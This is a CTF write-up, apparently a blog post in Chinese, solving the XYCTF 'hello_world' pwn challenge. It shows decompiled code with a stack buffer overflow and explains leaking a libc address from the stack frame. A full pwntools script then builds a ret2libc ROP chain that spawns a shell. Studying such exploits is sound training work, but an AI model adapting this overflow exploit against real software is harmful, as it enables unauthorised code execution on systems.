---
title: '[xyctf] hello_world'
date: 2024-11-28 1:41 +0800
categories: [ctf,pwn]
tags: [stack_leak,64bit,__libc_start_main]
---

**反编译分析**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  init();
  printf("%s", "please input your name: ");
  read(0, buf, 0x48uLL);
  printf("Welcome to XYCTF! %s\n", buf);
  printf("%s", "please input your name: ");
  read(0, buf, 0x48uLL);
  printf("Welcome to XYCTF! %s\n", buf);
  return 0;
}
```

乍一看非常常规的`leak_libc`，这道题目特殊之处在于`pop rdi`的rop链被删除了，所以我们不能通过泄漏got表的方式泄漏出libc，需要泄漏栈帧的内容，通过相对偏移确定`__libc_start_main`的地址，进一步泄漏出`libc`。再通过`libc`中的`rop`链得到`shell`。

寻找偏移方法：在pwndbg中通过 `distance &__libc_start_main {栈帧泄漏的地址}`。

```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
elf = ELF('./vuln')
libc = ELF('./libc.so.6')
io = gdb.debug('./vuln')
padding = 0x28

payload1 = b'A'*(padding-1)+b'B'
io.sendlineafter('please input your name: ',payload1)
io.recvuntil(b'B')

libc_start_main_addr = u64(io.recv(6).ljust(8,b'\x00'))+0xb6
log.info('libc_start_main_addr => ',hex(libc_start_main_addr))

libc_base = libc_start_main_addr - libc.sym['__libc_start_main']
sys_addr = libc_base + libc.sym['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
rdi_pop_addr = 0x000000000002a3e5 + libc_base       #: pop rdi ; ret
ret_addr = 0x0000000000029139 + libc_base      		  #: ret

payload2 = b"A"*padding + p64(ret_addr) + p64(rdi_pop_addr) + p64(bin_sh_addr) + p64(sys_addr)

io.sendlineafter('please input your name: ',payload2)
io.interactive()

```

